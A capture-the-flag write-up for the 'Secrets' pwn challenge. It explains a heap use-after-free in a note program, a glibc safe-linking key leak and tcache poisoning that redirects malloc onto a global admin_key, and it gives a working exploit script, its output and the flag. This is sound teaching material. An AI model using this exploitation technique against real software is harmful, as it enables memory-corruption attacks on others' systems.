# Secrets

*   **Event:** New Year CTF 2026
*   **Category:** Pwn
*   **Description:** *Vasily believes that memory can keep secrets.*

## 1. TL;DR
The challenge involves a **Heap Use-After-Free (UAF)** vulnerability in a secure note application. The program fails to clear pointers after freeing memory. We exploit this to bypass Glibc **Safe Linking** (pointer encryption), perform **Tcache Poisoning**, and force `malloc` to return a pointer to a global variable named `admin_key`. By overwriting this key with the string "HACKED", we trick the program into giving us the flag.

## 2. Problem Analysis

### Static Analysis
First, we analyzed the binary protections using `checksec` (from the provided `AI-REPORT.json`).

| Protection | Status | Meaning for us |
| :--- | :--- | :--- |
| **Arch** | amd64 | 64-bit architecture. |
| **RELRO** | **Partial** | The Global Offset Table (GOT) is writable (though we didn't need it). |
| **Canary** | No | Stack buffer overflows would be easy, but this is a heap challenge. |
| **NX** | Enabled | We cannot execute shellcode on the stack or heap. |
| **PIE** | **No PIE** | **Critical.** Code and global variable addresses are static. We know exactly where `admin_key` is located (`0x4040c0`). |

### Decompilation & Logic
Using the Ghidra output provided in the report, we identified a menu-driven program with the following functions:

1.  **`alloc_note` (Malloc):** Allocates 0x30 bytes for a note.
2.  **`free_note` (Free):** Frees a note based on an index. **CRITICAL BUG:** It calls `free()` but **does not set the pointer to NULL**. This is a text-book Use-After-Free (UAF).
3.  **`edit_note`:** Writes data to a note pointer. Because of the UAF, we can write data to a chunk that has already been freed.
4.  **`read_note`:** Reads data from a note. Because of UAF, we can read the internal heap metadata (like forward pointers) of a freed chunk.
5.  **`check_admin`:** The win function. It checks a global variable:
    ```c
    if (strcmp(admin_key, "HACKED") == 0) {
        // print flag
    }
    ```

## 3. Initial Guesses
When looking at the `AI-REPORT.json`, the automated tools flagged "dangerous function printf" and "stack buffer overflow". However, seeing `malloc` and `free` in a menu usually guarantees a Heap challenge.

My initial thought process was:
1.  **Goal:** We need to pass the check `admin_key == "HACKED"`.
2.  **Obstacle:** `admin_key` is a global variable, not a note. We can't edit it directly.
3.  **Theory:** If we can make `malloc` return the address of `admin_key`, we can use `edit_note` to write "HACKED" there.
4.  **Technique:** **Tcache Poisoning**. In modern Glibc, freed chunks are stored in a "Tcache" (Thread Local Cache). If we change the "Next Pointer" (fd) of a freed chunk to point to `admin_key`, the *next* allocation will happen at `admin_key`.

## 4. First Try & Refinement

### The Safe Linking Hurdle
I attempted to simply free a chunk and overwrite its pointer. However, the system uses a newer version of Glibc (2.32+). This introduced **Safe Linking**.
*   **What it is:** The "Next Pointer" isn't stored as raw text. It is encrypted: `Stored_Ptr = (Address_Of_Chunk >> 12) ^ Next_Ptr`.
*   **The Fix:** We used the UAF to `read_note` on a freed chunk. Since it was the last chunk, the `Next_Ptr` was NULL (0).
    *   `Read_Value = (Address >> 12) ^ 0`
    *   This leaked the **Heap Key** (Mask) needed to encrypt our own pointers.

### The Tcache Count Issue (The "First Try" Failure)
I wrote a script to:
1. Alloc Chunk A.
2. Free Chunk A.
3. Poison Chunk A to point to `admin_key`.
4. Alloc (to consume Chunk A).
5. Alloc (expecting `admin_key`).

**Result:** It failed.
**Why:** Tcache keeps a "count" of available chunks.
*   Free Chunk A -> Count = 1.
*   Alloc (Step 4) -> Count = 0.
*   Alloc (Step 5) -> Count is 0, so `malloc` assumes Tcache is empty and ignores our poisoned pointer!

## 5. Flag Recovery

To solve the count issue, we simply freed **two** chunks. This ensured the count remained high enough (Count > 0) to allow us to grab the poisoned chunk.

### The Winning Strategy
1.  **Setup:** Allocate Chunk 0.
2.  **Leak Key:** Free Chunk 0, Read Chunk 0. We get the Safe Linking key.
3.  **Increase Count:** Allocate two chunks (0 and 1). Free *both* of them. Tcache Count is now 2.
4.  **Poison:** Edit Chunk 0 (which is sitting in the Tcache). We overwrite its "Next Pointer" with: `(Address of admin_key) ^ Key`.
5.  **Exploit:**
    *   `alloc_note` (consumes Chunk 0).
    *   `alloc_note` (The allocator follows our poisoned pointer and returns the address of `admin_key`!).
6.  **Win:** We `edit_note` on this new chunk and write "HACKED". Then we call `check_admin`.

### Solution Script
```python
# ... (setup code) ...

# 1. Leak the Heap Mask (Safe Linking)
alloc_note(0, b"A"*8)
free_note(0)
leak_raw = read_note(0)
heap_key = u64(leak_raw[:8].ljust(8, b'\x00'))
log.success(f"Heap Safe-Linking Key leaked: {hex(heap_key)}")

# 2. Reset and Prepare Tcache Count = 2
alloc_note(0, b"RESET") 
alloc_note(0, b"A")
alloc_note(1, b"B")
free_note(1)
free_note(0) 

# 3. Poison the Tcache
target_addr = 0x4040c0 # Address of admin_key
poison_payload = p64(target_addr ^ heap_key) # Encrypt pointer
edit_note(0, poison_payload)

# 4. Trigger Arbitrary Write
alloc_note(2, b"JUNK")       # Consumes chunk 0
alloc_note(3, b"HACKED\x00") # Returns admin_key address! Write the secret.

# 5. Get Flag
check_admin()
```

### Result
```text
[*] Starting Tcache Poisoning Attack (Count Fix)...
[+] Heap Safe-Linking Key leaked: 0x17d57
[*] Targeting admin_key at: 0x4040c0
[*] Checking admin key...
[+] Receiving all data: Done (39B)
grodno{4DM1n_N3_Z48YL_7C4Ch3_p0150N3D}
```

## 6. What We Learn
*   **Dangling Pointers are Dangerous:** The root cause was `free_note` not setting `notes[index] = NULL`. This single line of code missing allowed reading (leaking ASLR/Heap info) and writing (poisoning) freed memory.
*   **Safe Linking isn't Bulletproof:** While encryption (XORing the pointer) adds a layer of security, it is easily bypassed if you have a read primitive (like UAF) to leak the mask.
*   **Tcache Mechanics:** For beginners, it's crucial to remember that Tcache is LIFO (Last-In, First-Out) and maintains a count. If the count hits 0, your poisoned pointer is useless. Always ensure you have enough free chunks in the bin!

